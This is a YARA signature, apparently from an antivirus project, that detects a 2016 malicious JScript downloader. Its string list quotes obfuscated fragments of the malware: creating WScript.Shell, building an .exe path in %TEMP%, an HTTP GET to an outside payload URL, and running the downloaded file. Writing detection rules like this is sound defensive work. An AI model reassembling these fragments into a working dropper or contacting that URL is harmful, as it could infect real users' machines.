rule sig_20160328_e5a22cf09656a0180949ac8510038373 {
  meta:
    description = "datamaliciousorder - file 20160328_e5a22cf09656a0180949ac8510038373.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9500b4a5177548e5e6766f4204f43eb39bfc86211e152affa2451ff61fc2b175"

  strings:
    $s1  = "function Txqeje() {return Bpjtynxmw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lahtqbSDZ8B.exe\";};" fullword ascii
    $s2  = "do {WScript[Vbeorbd](Zijximu() * 11)} while (Gxkyemryp[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Gwuyif(Pqhyh, Arhkxnjkm){return Pqhyh - Arhkxnjkm;};" fullword ascii
    $s4  = "var Bpjtynxmw = function Ldvagr() {return WScript[Egfrmg](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Gxkyemryp[Qmnig](\"GET\", \"http://energyunlimited.co.nz/o2apf\", false);" fullword ascii
    $s6  = "function Oloemm(Cdnrjf){Bpjtynxmw[\"Run\"](Cdnrjf, Bmxhbj, Bmxhbj);};" fullword ascii
    $s7  = "function Llygypiehj() {return ((Hgxpsg == true) && (Hgxpsg == Exsqjjwb)) ? 1 : Bmxhbj;};" fullword ascii
    $s8  = "function Zoyqio(){return Egfrmg;};" fullword ascii
    $s9  = "Hgxpsg = true; " fullword ascii
    $s10 = "return Gwuyif(Cwlwbxg, Jagymo);" fullword ascii
    $s11 = "function Sqbnazgawj(){return Rumbxlvhii;};" fullword ascii
    $s12 = "var Hgxpsg = false;" fullword ascii
    $s13 = "var Gtkokkf = new this[\"Date\"]();" fullword ascii
    $s14 = "Exsqjjwb = true; " fullword ascii
    $s15 = " while (Buhnli){" fullword ascii
    $s16 = "function Zijximu(){return 22;};" fullword ascii
    $s17 = "var Zttolcmcx = false;" fullword ascii
    $s18 = "var Exsqjjwb = false;" fullword ascii
    $s19 = "function Onhvcjync()" fullword ascii
    $s20 = "} catch(Hgvlqsf){Buhnli = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}